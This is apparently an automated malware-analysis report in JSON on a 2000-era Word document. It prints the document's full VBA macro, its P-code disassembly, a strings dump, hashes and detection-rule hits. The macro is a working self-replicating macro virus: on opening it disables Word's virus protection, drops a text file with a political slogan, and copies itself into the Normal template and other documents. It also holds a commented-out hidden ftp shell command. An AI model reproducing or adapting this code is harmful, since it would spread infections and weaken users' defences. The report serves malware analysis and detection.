{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AddFromString": "May attempt to modify the VBA code",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Chr": "May attempt to obfuscate specific str",
            "CodeModule": "May attempt to modify the VBA code",
            "Command": "May run PowerShell commands",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Shell": "May run an executable file or a system command",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "Write": "May write to a file",
            "vbHide": "May run an executable file or a system command"
        },
        "macro": "\nPrivate Sub Document_Open()\nOn Error Resume Next\n\n'DECLARATIONS\n\nDim sViralCode As String, nFreeFile As Integer\nDim oNormal As Object, oDocument As Object, sFileName As String\nDim rRange As Range\n\nConst cIndicator = \"INDIA\"  ' CONSTANT TO FIND IF THE FILE IS ALREADY INFECTED OR NOT\n\n    Options.VirusProtection = False 'SET VIRUS PROTECTION TO OFF MODE\n    nFreeFile = FreeFile\n\n    Randomize\n    sFileName = \"\\India\" + Str(32767 * Rnd) + \".txt\"\n    \n    Open CurDir + sFileName For Output As #nFreeFile\n        Write #nFreeFile, \"Kashmir is an integral part of INDIA. JAI HIND\"\n    Close #nFreeFile\n    \n    Set oDocument = ActiveDocument.VBProject.VBComponents.Item(1)\n    Set oNormal = NormalTemplate.VBProject.VBComponents.Item(1)\n    \n    If (oNormal.CodeModule.Find(cIndicator, 1, 1, 999, 999)) = False Then\n        sViralCode = oDocument.CodeModule.Lines(1, oDocument.CodeModule.CountOfLines)\n        ViralCode = ViralCode & Chr(10)\n        oNormal.CodeModule.DeleteLines 1, oNormal.CodeModule.CountOfLines\n        oNormal.CodeModule.AddFromString sViralCode\n        \n    End If\n\n'    Shell \"Command.com /c ftp.exe -n -s:\" + CurDir + sFileName, vbHide\n    \n    If (oDocument.CodeModule.Find(cIndicator, 1, 1, 999, 999)) = False Then\n        sViralCode = oNormal.CodeModule.Lines(1, oNormal.CodeModule.CountOfLines)\n        ViralCode = ViralCode & Chr(10)\n        oDocument.CodeModule.DeleteLines 1, oNormal.CodeModule.CountOfLines\n        oDocument.CodeModule.AddFromString sViralCode\n    End If\n    \n    ActiveDocument.Save\n    NormalTemplate.Save\n   \nEnd Sub\n\n\n' Virus Created By An Indian Citizen\n\n\n\n\n' Processing file: VirusShare_25d112e247204b4951ea3637f659df7c\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 3586 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Private Sub Document_Open())\n' Line #2:\n' \tOnError (Resume Next) \n' Line #3:\n' Line #4:\n' \tQuoteRem 0x0000 0x000C \"DECLARATIONS\"\n' Line #5:\n' Line #6:\n' \tDim \n' \tVarDefn sViralCode (As String)\n' \tVarDefn nFreeFile (As Integer)\n' Line #7:\n' \tDim \n' \tVarDefn oNormal (As Object)\n' \tVarDefn oDocument (As Object)\n' \tVarDefn sFileName (As String)\n' Line #8:\n' \tDim \n' \tVarDefn rRange (As Range)\n' Line #9:\n' Line #10:\n' \tDim (Const) \n' \tLitStr 0x0005 \"INDIA\"\n' \tVarDefn cIndicator\n' \tQuoteRem 0x001C 0x0038 \" CONSTANT TO FIND IF THE FILE IS ALREADY INFECTED OR NOT\"\n' Line #11:\n' Line #12:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' \tQuoteRem 0x0024 0x0020 \"SET VIRUS PROTECTION TO OFF MODE\"\n' Line #13:\n' \tLd Friend \n' \tSt nFreeFile \n' Line #14:\n' Line #15:\n' \tArgsCall Read 0x0000 \n' Line #16:\n' \tLitStr 0x0006 \"\\India\"\n' \tLitDI2 0x7FFF \n' \tLd Rnd \n' \tMul \n' \tArgsLd Str 0x0001 \n' \tAdd \n' \tLitStr 0x0004 \".txt\"\n' \tAdd \n' \tSt sFileName \n' Line #17:\n' Line #18:\n' \tLd CurDir \n' \tLd sFileName \n' \tAdd \n' \tLd nFreeFile \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #19:\n' \tLd nFreeFile \n' \tSharp \n' \tWriteChan \n' \tLitStr 0x002E \"Kashmir is an integral part of INDIA. JAI HIND\"\n' \tPrintItemNL \n' Line #20:\n' \tLd nFreeFile \n' \tSharp \n' \tClose 0x0001 \n' Line #21:\n' Line #22:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet oDocument \n' Line #23:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet oNormal \n' Line #24:\n' Line #25:\n' \tLd cIndicator \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x03E7 \n' \tLitDI2 0x03E7 \n' \tLd oNormal \n' \tMemLd CodeModule \n' \tArgsMemLd Find 0x0005 \n' \tParen \n' \tLitVarSpecial (False)\n' \tEq \n' \tIfBlock \n' Line #26:\n' \tLitDI2 0x0001 \n' \tLd oDocument \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLd oDocument \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt sViralCode \n' Line #27:\n' \tLd ViralCode \n' \tLitDI2 0x000A \n' \tArgsLd Chr 0x0001 \n' \tConcat \n' \tSt ViralCode \n' Line #28:\n' \tLitDI2 0x0001 \n' \tLd oNormal \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLd oNormal \n' \tMemLd CodeModule \n' \tArgsMemCall DeleteLines 0x0002 \n' Line #29:\n' \tLd sViralCode \n' \tLd oNormal \n' \tMemLd CodeModule \n' \tArgsMemCall AddFromString 0x0001 \n' Line #30:\n' Line #31:\n' \tEndIfBlock \n' Line #32:\n' Line #33:\n' \tQuoteRem 0x0000 0x0046 \"    Shell \"Command.com /c ftp.exe -n -s:\" + CurDir + sFileName, vbHide\"\n' Line #34:\n' Line #35:\n' \tLd cIndicator \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x03E7 \n' \tLitDI2 0x03E7 \n' \tLd oDocument \n' \tMemLd CodeModule \n' \tArgsMemLd Find 0x0005 \n' \tParen \n' \tLitVarSpecial (False)\n' \tEq \n' \tIfBlock \n' Line #36:\n' \tLitDI2 0x0001 \n' \tLd oNormal \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLd oNormal \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt sViralCode \n' Line #37:\n' \tLd ViralCode \n' \tLitDI2 0x000A \n' \tArgsLd Chr 0x0001 \n' \tConcat \n' \tSt ViralCode \n' Line #38:\n' \tLitDI2 0x0001 \n' \tLd oNormal \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLd oDocument \n' \tMemLd CodeModule \n' \tArgsMemCall DeleteLines 0x0002 \n' Line #39:\n' \tLd sViralCode \n' \tLd oDocument \n' \tMemLd CodeModule \n' \tArgsMemCall AddFromString 0x0001 \n' Line #40:\n' \tEndIfBlock \n' Line #41:\n' Line #42:\n' \tLd ActiveDocument \n' \tArgsMemCall Save 0x0000 \n' Line #43:\n' \tLd NormalTemplate \n' \tArgsMemCall Save 0x0000 \n' Line #44:\n' Line #45:\n' \tEndSub \n' Line #46:\n' Line #47:\n' Line #48:\n' \tQuoteRem 0x0000 0x0023 \" Virus Created By An Indian Citizen\"\n' Line #49:\n' Line #50:\n' Line #51:\n"
    },
    "filename": "VirusShare_25d112e247204b4951ea3637f659df7c",
    "filesize": 28160,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: Netra, Template: Normal, Last Saved By: RIPL, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Thu Apr  6 08:46:00 2000, Last Saved Time/Date: Thu Apr  6 08:46:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "25d112e247204b4951ea3637f659df7c",
        "sha1": "2766e7265ffaf096625377bac943aff36bcef50a",
        "sha256": "b9139283cc991a8102a9c1d76a23cec5ce2d0ca82ef1f96b2be66b61cee9755d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "/ =!",
            "P3DP3D",
            "Netra",
            "Normal",
            "RIPL",
            "Microsoft Word 8.0",
            "NETRASCRIBE",
            "Title",
            "_PID_GUID",
            "Project",
            "f.8 ",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "mMSFo@rms>",
            "FE31245",
            "40-E92A-",
            "11D3-9F5",
            "F80AD890BC43",
            "WD#Microsoft ",
            " Libprary",
            "CD722-F1",
            "13'PJP\\VB$E\\(EX(.",
            "CxRN@UalCxNTaQx",
            " +\t,C",
            "OfficDOA@f",
            "G{2DF",
            "8D04C-5B",
            "f01B-BDE5",
            "fAA@4",
            "fD:\\PRO",
            "GRAM FIL",
            "ES\\OFFIC",
            ">O97.DLLC",
            " 8.0Rg",
            "ThisDoc@ument",
            "DECLARATIONS",
            "INDIA",
            " CONSTANT TO FIND IF THE FILE IS ALREADY INFECTED OR NOT",
            "SET VIRUS PROTECTION TO OFF MODE ",
            "\\India",
            ".txt",
            "Kashmir is an integral part of INDIA. JAI HIND",
            "dian ",
            "    Shell \"Command.com /c ftp.exe -n -s:\" + CurDir + sFileName, vbHidea",
            " Virus Created By An Indian Citizen",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            ": Su",
            "b u_Open",
            "On E",
            "rror Res",
            " Next",
            "'DECLARATIONS",
            "Dim sVir",
            "alCode A",
            "s Sng, nFreeFi}",
            "Integer4",
            "Object, o@=\t",
            " rR8ang",
            "nst cInd0icat",
            "DIA\"  ' ",
            "CVTANT T",
            " IF ",
            "LE I",
            "S ALREAD",
            "Y INFECT",
            "ED OR NO",
            "Opti",
            ".9usPro",
            "u 'S",
            "ET VIRUS PROT",
            "OFF MODE",
            "GD= ",
            ">1\\!A5a\" +V(3",
            "2767 * R",
            "\".tx",
            "p CurDir",
            "F@E@Output",
            "Y#F#C",
            "WriG",
            ", \"Kashm",
            "is an i",
            "qz part ",
            "LX. JAI HU!Clf M",
            "F{=0 Act",
            "Comp",
            "ons.Itexm(1",
            "C\"If ",
            "(.WModu",
            "le.Find(",
            "I, 1B",
            "999$, ",
            "))>ThenC\t",
            "`=Y)",
            "Lines(\t]",
            "CountOfO",
            "gk= g",
            "& Chr(10",
            "Delete\"",
            "AddFrom{(~",
            "@End IfZ'",
            "Shell \"",
            " 9mand.co",
            "m /c ftp",
            ".exe -n ",
            "[U, vbHida",
            "\"6FE",
            "B'\"6L5h45",
            "?646\t{6%54+LqSav/Ll",
            "Sub=c",
            "us \u07a0B y An n `Citizec",
            "f.8 ",
            "2038ec2e66",
            "Wordk",
            "Win16~",
            "Win32",
            "MORE03246",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Document_Open",
            "sViralCoden*",
            "nFreeFile",
            "oNormal)s",
            "oDocumentH",
            "sFileName",
            "rRange",
            "Range",
            "cIndicator",
            "Options",
            "VirusProtectionoD",
            "RndR",
            "ActiveDocument\\",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "NormalTemplateq",
            "CodeModule",
            "Findn",
            "Lines",
            "CountOfLines!\\",
            "ViralCodeGs",
            "ChrK~",
            "DeleteLines",
            "AddFromString",
            "Save",
            "ID=\"{3A32C460-0BA2-11D4-9F54-0080AD89BC43}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"9C9E2FDF336937693769376937\"",
            "DPB=\"2D2F9E73BE05BF05BF05\"",
            "GC=\"BFBD0CE20CE69FE79FE760\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "ThisDocument",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.296761",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
